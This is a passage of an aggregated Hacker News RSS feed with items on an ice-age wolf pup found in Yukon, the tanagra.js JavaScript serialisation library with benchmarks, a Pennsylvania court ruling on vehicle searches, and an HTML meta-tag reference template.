src="https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/neil-loveless.jpeg"></p></div><figcaption>More precious than gold? Placer miner Neil Loveless put the wolf pup in a gold pan when he found it. At first, he thought it was a puppy that had fallen down a mine shaft.<!-- --> <!-- -->(Government of Yukon)</figcaption></figure></span></p>  <p>The scientists say&nbsp;it's that&nbsp;kind of collaboration with the mining community that makes their research possible.&nbsp;</p>  <p>Ice-age remains are commonly dug out of the permafrost in Yukon — bones of mammoths, bison and horses — but a complete specimen like&nbsp;Zhùr&nbsp;is very rare, at least for now.&nbsp;</p>  <p>Meachen&nbsp;hopes there may be more to find.&nbsp;</p>  <p>"As global warming continues to thaw the permafrost, one silver lining is that other exceptionally preserved frozen mummies will likely be discovered, providing new windows into the past," she said.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512461</guid>
            <pubDate>Tue, 22 Dec 2020 23:01:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serialising complex objects in JavaScript – an introduction to tanagra.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512195">thread link</a>) | @lukedawilson
<br/>
December 22, 2020 | https://blog.tietokone.io/serialising-complex-objects-in-javascript/ | <a href="https://web.archive.org/web/*/https://blog.tietokone.io/serialising-complex-objects-in-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><em>Originally posted on the <a href="https://www.toptal.com/javascript/serializing-complex-objects-in-javascript">Toptal blog</a>.</em></p>

<p>Modern websites typically retrieve data from a number of different locations, including databases and third-party APIs. For example, when authenticating a user, a website might look up the user record from the database, then embellish it with data from some external services via API calls. Minimising expensive calls to these data sources, such as disk access for database queries and internet roundtrips for API calls, is essential to maintaining a fast, responsive site. Data caching is a common optimisation technique used to achieve this.</p>

<p>Processes store their working data in memory. If a web server runs in a single process (such as Node.js/Express), then this data can easily be cached using a memory cache running in the same process. However, load-balanced web servers span multiple processes, and even when working with a single process, you might want the cache to persist when the server is restarted. This necessitates an out-of-process caching solution such as Redis, which means the data needs to be serialised somehow, and deserialised when read from the cache.</p>

<p>Serialisation and deserialisation are relatively straightforward to achieve in statically typed languages such as C#. However, the dynamic nature of Javascript makes the problem a little trickier. While ECMAScript 6 (ES6) introduced classes, the fields on these classes (and their types) aren’t defined until they are initialised—which may not be when the class is instantiated—and the return types of fields and functions aren’t defined at all in the schema. What’s more, the structure of the class can easily be changed at runtime—fields can be added or removed, types can be changed, etc. While this is possible using reflection in C#, reflection represents the “dark arts” of that language, and developers expect it to break functionality.</p>

<p>I was presented with this problem at work a few years ago when working on the Toptal core team. We were building an agile dashboard for our teams, which needed to be fast, otherwise, developers and product owners wouldn’t use it. We pulled data from a number of sources: our work-tracking system, our project management tool, and a database. The site was built in Node.js/Express, and we had a memory cache to minimise calls to these data sources. However, our rapid, iterative development process meant we deployed (and therefore restarted) several times a day, invalidating the cache and thereby losing many of its benefits.</p>

<p>An obvious solution was an out-of-process cache such as <a href="https://redislabs.com/">Redis</a>. However, after some research, I found that no good serialisation library existed for JavaScript. The built-in JSON.stringify/JSON.parse methods return data of the object type, losing any functions on the prototypes of the original classes. This meant the deserialised objects couldn’t simply be used “in-place” within our application, which would therefore require considerable refactoring to work with an alternative design.</p>

<h2 id="requirements-for-the-library">Requirements for the Library</h2>

<p>In order to support serialisation and deserialisation of arbitrary data in Javascript, with the deserialised representations and originals usable interchangeably, we needed a serialisation library with the following properties:</p>

<ul>
  <li>The deserialised representations must have the same prototype (functions, getters, setters) as the original objects</li>
  <li>The library should support nested complexity types (including arrays and maps), with the prototypes of the nested objects set correctly</li>
  <li>It should be possible to serialise and deserialise the same objects multiple times—the process should be idempotent</li>
  <li>The serialisation format should be easily transmittable over TCP and storable using Redis or a similar service</li>
  <li>Minimal code changes should be required to mark a class as serialisable</li>
  <li>The library routines should be fast.</li>
  <li>Ideally, there should be some way to support deserialisation of old versions of a class, through some sort of mapping/versioning</li>
</ul>

<h2 id="implementation">Implementation</h2>

<p>To plug this gap, I decided to write  <em>Tanagra.js</em>, a general-purpose serialisation library for Javascript. The name of the library is a reference to one of my favorite episodes of  <em>Star Trek: The Next Generation</em>, where the crew of the  <em>Enterprise</em>  must learn to communicate with a mysterious alien race whose language is unintelligible. This serialisation library supports common data formats to avoid such problems.</p>

<p><em>Tanagra.js</em>  is designed to be simple and lightweight, and it currently supports Node.js (it hasn’t been tested in-browser, but in theory, it should work) and ES6 classes (including Maps). The main implementation supports JSON, and an experimental version supports Google Protocol Buffers. The library requires only standard Javascript (currently tested with ES6 and Node.js), with no dependency on experimental features,  <em>Babel</em>  transpiling, or  <em>TypeScript</em>.</p>

<p>Serialisable classes are marked as such with a method call when the class is exported:</p>

<div><div><pre><code><span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>myUniqueSerialisationKey</span><span>)</span>
</code></pre></div></div>

<p>The method returns a  <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxy</a>  to the class, which intercepts the constructor and injects a unique identifier. (If not specified, this defaults to the class name.) This key is serialised with the rest of the data, and the class also exposes it as a static field. If the class contains any nested types (i.e., members with types that need serialising), they are also specified in the method-call:</p>

<div><div><pre><code><span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>[</span><span>Bar</span><span>,</span> <span>Baz</span><span>],</span> <span>myUniqueSerialisationKey</span><span>)</span>
</code></pre></div></div>

<p>(Nested types for previous versions of the class can also be specified in a similar way, so that, for example, if you serialise a Foo1, it can be deserialised into a Foo2.)</p>

<p>During serialisation, the library recursively builds up a global map of keys to classes, and uses this during deserialisation. (Remember, the key is serialised with the rest of the data.) In order to know the type of the “top-level” class, the library requires that this be specified in the deserialisation call:</p>

<div><div><pre><code><span>const</span> <span>foo</span> <span>=</span> <span>decodeEntity</span><span>(</span><span>serializedFoo</span><span>,</span> <span>Foo</span><span>)</span>
</code></pre></div></div>

<p>An experimental auto-mapping library walks the module tree and generates the mappings from the class names, but this only works for uniquely named classes.</p>

<h2 id="project-layout">Project Layout</h2>

<p>The project is divided into a number of modules:</p>

<ul>
  <li><a href="https://www.npmjs.com/package/tanagra-core">tanagra-core</a>  - common functionality required by the different serialisation formats, including the function for marking classes as  <em>serializable</em></li>
  <li><a href="https://www.npmjs.com/package/tanagra-json">tanagra-json</a>  - serialises the data into JSON format</li>
  <li><a href="https://www.npmjs.com/package/tanagra-protobuf">tanagra-protobuf</a>  - serialises the data into Google protobuffers format (experimental)</li>
  <li><a href="https://www.npmjs.com/package/tanagra-protobuf-redis-cache">tanagra-protobuf-redis-cache</a>  - a helper library for storing serialised protobufs in  <em>Redis</em></li>
  <li><a href="https://www.npmjs.com/package/tanagra-auto-mapper">tanagra-auto-mapper</a>  - walks the module tree in  <em>Node.js</em>  to build up a map of classes, meaning the user doesn’t have to specify the type to deserialise to (experimental).</li>
</ul>

<p>Note that the library uses US spelling.</p>

<h2 id="example-usage">Example Usage</h2>

<p>The following example declares a serialisable class and uses the tanagra-json module to serialise/deserialise it:</p>

<div><div><pre><code><span>const</span> <span>serializable</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>tanagra-core</span><span>'</span><span>).</span><span>serializable</span>
<span>class</span> <span>Foo</span> <span>{</span>
  <span>constructor</span><span>(</span><span>bar</span><span>,</span> <span>baz1</span><span>,</span> <span>baz2</span><span>,</span> <span>fooBar1</span><span>,</span> <span>fooBar2</span><span>)</span> <span>{</span>
	<span>this</span><span>.</span><span>someNumber</span> <span>=</span> <span>123</span>
	<span>this</span><span>.</span><span>someString</span> <span>=</span> <span>'</span><span>hello, world!</span><span>'</span>
	<span>this</span><span>.</span><span>bar</span> <span>=</span> <span>bar</span> <span>// a complex object with a prototype</span>
	<span>this</span><span>.</span><span>bazArray</span> <span>=</span> <span>[</span><span>baz1</span><span>,</span> <span>baz2</span><span>]</span>
	<span>this</span><span>.</span><span>fooBarMap</span> <span>=</span> <span>new</span> <span>Map</span><span>([</span>
  	<span>[</span><span>'</span><span>a</span><span>'</span><span>,</span> <span>fooBar1</span><span>],</span>
  	<span>[</span><span>'</span><span>b</span><span>'</span><span>,</span> <span>fooBar2</span><span>]</span>
	<span>])</span>
  <span>}</span>
<span>}</span>

<span>// Mark class `Foo` as serializable and containing sub-types `Bar`, `Baz` and `FooBar`</span>
<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>[</span><span>Bar</span><span>,</span> <span>Baz</span><span>,</span> <span>FooBar</span><span>])</span>

<span>...</span>

<span>const</span> <span>json</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>tanagra-json</span><span>'</span><span>)</span>
<span>json</span><span>.</span><span>init</span><span>()</span>
<span>// or:</span>
<span>// require('tanagra-protobuf')</span>
<span>// await json.init()</span>

<span>const</span> <span>foo</span> <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>bar</span><span>,</span> <span>baz</span><span>)</span>
<span>const</span> <span>encoded</span> <span>=</span> <span>json</span><span>.</span><span>encodeEntity</span><span>(</span><span>foo</span><span>)</span>

<span>...</span>

<span>const</span> <span>decoded</span> <span>=</span> <span>json</span><span>.</span><span>decodeEntity</span><span>(</span><span>encoded</span><span>,</span> <span>Foo</span><span>)</span>
</code></pre></div></div>

<h2 id="performance">Performance</h2>

<p>I compared the performance of the two serialisers (the  <em>JSON</em>  serialiser and experimental  <em>protobufs</em>  serialiser) with a control (native JSON.parse and JSON.stringify). I conducted a total of 10 trials with each.</p>

<p>I tested this on my 2017  <em>Dell XPS15</em>  laptop with 32Gb memory, running Ubuntu 17.10.</p>

<p>I serialised the following nested object:</p>

<div><div><pre><code><span>foo</span><span>:</span> <span>{</span>
  <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Hello foo</span><span>"</span><span>,</span>
  <span>"</span><span>number</span><span>"</span><span>:</span> <span>123123</span><span>,</span>
  <span>"</span><span>bars</span><span>"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Complex Bar 1</span><span>"</span><span>,</span>
      <span>"</span><span>date</span><span>"</span><span>:</span> <span>"</span><span>2019-01-09T18:22:25.663Z</span><span>"</span><span>,</span>
      <span>"</span><span>baz</span><span>"</span><span>:</span> <span>{</span>
    	<span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Simple Baz</span><span>"</span><span>,</span>
    	<span>"</span><span>number</span><span>"</span><span>:</span> <span>456456</span><span>,</span>
    	<span>"</span><span>map</span><span>"</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
      <span>}</span>
    <span>},</span>
    <span>{</span>
      <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Complex Bar 2</span><span>"</span><span>,</span>
      <span>"</span><span>date</span><span>"</span><span>:</span> <span>"</span><span>2019-01-09T18:22:25.663Z</span><span>"</span><span>,</span>
      <span>"</span><span>baz</span><span>"</span><span>:</span> <span>{</span>
    	<span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Simple Baz</span><span>"</span><span>,</span>
    	<span>"</span><span>number</span><span>"</span><span>:</span> <span>456456</span><span>,</span>
    	<span>"</span><span>map</span><span>"</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>],</span>
  <span>"</span><span>bazs</span><span>"</span><span>:</span> <span>Map</span> <span>{</span>
    <span>'</span><span>baz1</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz1</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>111</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>},</span>
    <span>'</span><span>baz2</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz2</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>222</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>},</span>
    <span>'</span><span>baz3</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz3</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>333</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>}</span>
  <span>},</span>
<span>}</span>
</code></pre></div></div>

<h3 id="write-performance">Write performance</h3>

<table>
  <thead>
    <tr>
      <th>Serialisation method</th>
      <th>Ave. inc. first trial (ms)</th>
      <th>StDev. inc. first trial (ms)</th>
      <th>Ave. ex. first trial (ms)</th>
      <th>StDev. ex. first trial (ms)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>JSON</td>
      <td>0.115</td>
      <td>0.0903</td>
      <td>0.0879</td>
      <td>0.0256</td>
    </tr>
    <tr>
      <td>Google Protobufs</td>
      <td>2.00</td>
      <td>2.748</td>
      <td>1.13</td>
      <td>0.278</td>
    </tr>
    <tr>
      <td>Control group</td>
      <td>0.0155</td>
      <td>0.00726</td>
      <td>0.0139</td>
      <td>0.00570</td>
    </tr>
  </tbody>
</table>

<h3 id="read-performance">Read performance</h3>

<table>
  <thead>
    <tr>
      <th>Serialisation method</th>
      <th>Ave. inc. first trial (ms)</th>
      <th>StDev. inc. first trial (ms)</th>
      <th>Ave. ex. first trial (ms)</th>
      <th>StDev. ex. first trial (ms)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>JSON</td>
      <td>0.133</td>
      <td>0.102</td>
      <td>0.104</td>
      <td>0.0429</td>
    </tr>
    <tr>
      <td>Google Protobufs</td>
      <td>2.62</td>
      <td>1.12</td>
      <td>2.28</td>
      <td>0.364</td>
    </tr>
    <tr>
      <td>Control group</td>
      <td>0.0135</td>
      <td>0.00729</td>
      <td>0.0115</td>
      <td>0.00390</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>The  <em>JSON</em>  serialiser is around 6-7 times slower than native serialisation. The experimental  <em>protobufs</em>  serialiser is around 13 times slower than the  <em>JSON</em>  serialiser, or 100 times slower than native serialisation.</p>

<p>Additionally, the internal caching of schema/structural information within each serialiser clearly has an effect on performance. For the JSON serialiser, the first write is about four times slower than the average. For the protobuf serialiser, it’s nine times slower. So writing objects whose metadata has already been cached is much quicker in either library.</p>

<p>The same effect was observed …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.tietokone.io/serialising-complex-objects-in-javascript/">https://blog.tietokone.io/serialising-complex-objects-in-javascript/</a></em></p>]]>
            </description>
            <link>https://blog.tietokone.io/serialising-complex-objects-in-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512195</guid>
            <pubDate>Tue, 22 Dec 2020 22:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pennsylvania Court Alters Police Rules for Warrantless Vehicle Searches]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511930">thread link</a>) | @tantalor
<br/>
December 22, 2020 | https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches | <a href="https://web.archive.org/web/*/https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div property="content:encoded"><p>Police must have probable cause as well as “exigent circumstances” in order to legally search a vehicle without a warrant, a divided Pennsylvania Supreme Court ruled Tuesday.</p> <p>The 4-3 decision said the state constitution's privacy protections are greater than the U.S. Constitution's and that those protections extend to vehicles. The court overruled its own 2014 decision that probable cause alone was sufficient, given that vehicles are inherently mobile.</p> <p>“Difficulties in clarifying the scope of the exigency requirement will lead to debates about what exactly the Pennsylvania Constitution demands in a given situation. But so what?”&nbsp;<a href="http://www.pacourts.us/assets/opinions/Supreme/out/J-51-2020mo%20-%20104639940122582972.pdf?cb=1">wrote&nbsp;</a>Justice Christine Donohue, referring to the state's constitutional language on searches.</p> <p>“The long history of&nbsp;<a href="https://www.legis.state.pa.us/cfdocs/legis/LI/consCheck.cfm?txtType=HTM&amp;ttl=00&amp;div=0&amp;chpt=1&amp;sctn=8&amp;subsctn=0">Article I, Section 8</a>&nbsp;and its heightened privacy protections do not permit us to carry forward a bright-line rule that gives short shrift to citizens’ privacy rights," Donohue wrote for the majority.</p> <p>Exigent circumstances might include a belief that people are in danger or that important evidence is about to disappear. Donohue said “the universe of qualifying ‘exigent circumstances’ is impossible to define with precision,” but they must go beyond that vehicles have wheels and can be driven away.</p> <p>In a&nbsp;<a href="https://supreme.justia.com/cases/federal/us/563/452/#tab-opinion-1963504">2011 search warrant case</a>&nbsp;that did not involve a vehicle, the U.S. Supreme Court listed as exigent circumstances the need to provide emergency aid, hot pursuit of a fleeing suspect or the prospect of the destruction of evidence.</p> <p>Donohue's opinion was joined by three of the other four Democrats on the court. Both Republican justices and Democratic Justice Kevin Dougherty dissented, arguing the 2014 precedent should stand.</p> <p>“When we become untethered from our previous decisions, we instantly implicate this court’s credibility and our ability to effectively adjudicate the many types of cases upon which litigants look to us for guidance,”&nbsp;<a href="http://www.pacourts.us/assets/opinions/Supreme/out/J-51-2020do2%20-%20104639940122585532.pdf?cb=1">wrote&nbsp;</a>Republican Justice Sallie Mundy.</p> <p>She said the previous standard of probable cause alone to justify a warrantless vehicle search “offered a bright-line rule already in effect" and “deferred to the needs of those we entrust with the difficult job of policing.”</p> <p>The court sent the Philadelphia case that prompted the decision back to county court to more fully examine whether exigent circumstances existed.</p> <p>In that case, the defendant had been convicted of possession of heroin with intent to deliver after a 2016 vehicle stop in which drugs were recovered from a locked metal box inside the vehicle he had been driving.</p> </div></div></div></div>]]>
            </description>
            <link>https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511930</guid>
            <pubDate>Tue, 22 Dec 2020 22:12:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quick Reference for all modern/useful HTML5 link and meta tags]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25511860">thread link</a>) | @smpnjn
<br/>
December 22, 2020 | https://fjolt.com/article/meta-tag-ref-html-quick-start | <a href="https://web.archive.org/web/*/https://fjolt.com/article/meta-tag-ref-html-quick-start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
        



<!--#sidebar-->
        <article id="content">
            
            <div id="content-text">
                <p><strong>For every HTML page you should have a few key elements to ensure fast loading, and good SEO</strong>. The template below gives you all of those features, which you can quickly customise for your needs. I've also listed all useful meta tags below if you want to pull them out individually.</p>

<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;My Website&lt;/title&gt;
        &lt;link rel="icon" type="text/png" href="https://fjolt.com/favicon.png"&gt;
        &lt;!-- load if you are using google fonts --&gt;
        &lt;!--&lt;link rel="preconnect" href="https://fonts.gstatic.com"&gt;--&gt;
        &lt;meta name=â€�descriptionâ€� content="Description of my website"&gt;
        &lt;meta name="robots" content="index,follow"&gt;
        &lt;meta name="keywords" content="tags,for,your,site"&gt;
        &lt;link rel="canonical" href="URL for this page"&gt;

        &lt;meta property="og:title" content="My Website" /&gt;
        &lt;meta property="og:description" content="Description of my website" /&gt;
        &lt;meta property="og:image" content="Image URL representing my website" /&gt;
        &lt;meta property="og:url" content="URL for this page" /&gt;
        &lt;meta property="og:site_name" content="My Website" /&gt;
        
        &lt;meta name="twitter:card" content="summary_large_image"&gt;
        &lt;meta name="twitter:site" content="https://fjolt.com"&gt;
        &lt;meta name="twitter:title" content="{{title}}"&gt;
        &lt;meta name="twitter:description" content="{{description}}"&gt;
        &lt;meta name="twitter:image" content="{{image}}"&gt;

        &lt;!-- For mobile devices --&gt;
        &lt;meta name="viewport" content="initial-scale=1, maximum-scale=1"&gt;
        
        &lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;
        &lt;!-- Use if you are using google analytics, replace [[ID HERE]] in script and code with your ID --&gt;
        &lt;!-- 
        &lt;script async src="https://www.googletagmanager.com/gtag/js?id=G-[[ID HERE]]"&gt;&lt;/script&gt;
        &lt;script&gt;
        var host = window.location.hostname;
            if(host !== "localhost") {
                window.dataLayer = window.dataLayer || [];
                function gtag(){dataLayer.push(arguments);}
                gtag('js', new Date());
    
                gtag('config', '[[ID HERE]]');
            }
        &lt;/script&gt;--&gt;
        &lt;!-- Preload your stylesheets --&gt;
        &lt;link rel="preload" href="/style.css" as="style" /&gt;
        &lt;!-- if you want to load some CSS async uncomment this --&gt;
        &lt;!--&lt;link rel="preload" href="/async.css" as="style" /&gt;--&gt;
    
        &lt;!-- Preload your fonts if necessary --&gt;
        &lt;link rel="preload" href="/fonts/fontName.ttf" as="font" crossorigin="anonymous" /&gt;
        &lt;link rel="preload" href="/fonts/fontName.ttf" as="font" crossorigin="anonymous" /&gt;
        
        &lt;!-- Load your stylesheets --&gt;
        &lt;link rel="stylesheet" href="/style.css" /&gt;
        &lt;!-- if you want to load some CSS async uncomment this --&gt;
        &lt;!--link rel="stylesheet" href="/async.css" media="print" onload="this.media='all'"&gt;--&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;!-- Your Website Body --&gt;
        &lt;!-- Your Main JS Script --&gt;
        &lt;script defer src="local.js"&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</pre>

<h2>Meta Tags</h2>
<h3>SEO</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>robots<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>index,follow<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>keywords<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>tags,for,your,site<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Linking</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>shortlink<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Short form link for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>canonical<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prev<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for the prev page in this series<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>next<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for the next page in this series<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>dns-prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a DNS server far to lookup early on<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a document or file to prefetch and cache<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prerender<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>The document should be optimised for rendering on the page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>preload<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a document or file to prefetch and cache which will be used in the page<span>"</span></span> <span>as</span><span><span>=</span><span>"</span>script<span>"</span></span><span>&gt;</span></span> 
</code></pre>
<h3>General Social Media Page</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>My Website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Image URL representing my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:url<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>URL for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:site_name<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>My Website<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Twitter</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:card<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>summary_large_image<span>"</span></span><span>&gt;</span></span> 
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:site<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Website URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Title for page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Image of page<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Apple Meta Tags</h3>
<pre><p>html <span>Copy</span></p><code>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>apple-mobile-web-app-capable<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>yes<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>apple-mobile-web-app-status-bar-style<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>black<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>format-detection<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>telephone=yes<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>initial-scale=1, maximum-scale=1<span>"</span></span> <span>user-scalable</span><span><span>=</span><span>"</span>no<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Social Media Video</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:secure_url<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Secure Video URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:types<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Format<span>"</span></span><span>&gt;</span></span> 
